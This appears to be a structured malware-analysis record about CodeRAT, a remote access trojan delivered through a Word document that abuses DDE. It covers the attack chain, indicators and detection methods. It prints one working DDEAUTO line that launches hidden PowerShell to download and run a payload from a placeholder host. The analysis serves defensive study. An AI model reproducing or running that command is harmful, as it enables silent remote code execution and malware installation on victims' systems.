package_info.package_versions: N/A (source code release, not a package manager version)
package_info.why_malicious: CodeRAT is a Remote Access Trojan (RAT) designed to provide attackers with remote control over infected systems. It is distributed via a malicious Microsoft Word document exploiting DDE, specifically targeting Farsi-speaking software developers. The malware enables unauthorized access, data exfiltration, and remote command execution, which are all hallmarks of malicious software.

execution_context.trigger: document open (user opens malicious Word document)

malicious_snippets.code_snippet: DDEAUTO c:\windows\system32\cmd.exe "/k powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')"
malicious_snippets.code_behavior: When the document is opened, the DDE field triggers execution of PowerShell, which downloads and executes a remote payload, resulting in the installation of the CodeRAT malware.

malice_analysis.why_suspicious: The use of DDE in a Word document to execute PowerShell and download code from the internet is a well-known malware delivery technique.
malice_analysis.violated_expectations: Normal Word documents should not execute system commands or download and run remote code.
malice_analysis.similar_legitimate_use: DDE can be used for legitimate data exchange between Office applications, but not for arbitrary code execution.

malicious_snippets.code_behavior: At runtime, the PowerShell script downloads the CodeRAT executable and launches it, establishing persistence and enabling remote access.

malice_analysis.why_suspicious: Downloading and executing a binary from an untrusted remote server is a classic malware installation technique.
malice_analysis.violated_expectations: Legitimate scripts should not fetch and execute arbitrary binaries from the internet.
malice_analysis.similar_legitimate_use: Software updaters may download and run new versions, but only from trusted sources and with user consent.

malicious_snippets.code_language: C# (or similar, as per typical RAT implementation)
malicious_snippets.code_behavior: At runtime, the RAT polls the attacker's server for commands, exfiltrates sensitive data, and executes arbitrary system commands as instructed by the attacker.

malice_analysis.why_suspicious: Remote command and control, data exfiltration, and arbitrary code execution are core malicious behaviors of RATs.
malice_analysis.violated_expectations: Normal software should not accept remote commands from untrusted sources or exfiltrate user data.
malice_analysis.similar_legitimate_use: Remote administration tools in enterprise environments, but with user consent and proper security controls.

attack_chain.action: User opens malicious Word document, triggering DDE exploit to run PowerShell.
attack_chain.leads_to: Download and execution of initial payload

attack_chain.action: PowerShell downloads and executes CodeRAT binary.
attack_chain.leads_to: Establishment of RAT on victim system

attack_chain.action: CodeRAT connects to attacker's server, exfiltrates data, and executes remote commands.
attack_chain.leads_to: Attacker gains persistent remote access and control

behavioral_signatures: Office document with DDE fields triggering PowerShell
PowerShell scripts downloading and executing binaries from untrusted domains
Processes polling external C2 servers for commands
Unusual data exfiltration to remote servers
file_indicators: Downloaded executables in public or temp directories (e.g., C:\Users\Public\CodeRAT.exe)
network_indicators: Frequent outbound requests to C2 infrastructure
detection_knowledge.how_to_detect: Monitor for Office documents containing DDE fields that launch PowerShell, detect PowerShell processes that download and execute remote binaries, flag unknown executables appearing in public directories, and alert on outbound connections to known malicious domains or C2 infrastructure. Correlate these behaviors to identify the full attack chain.
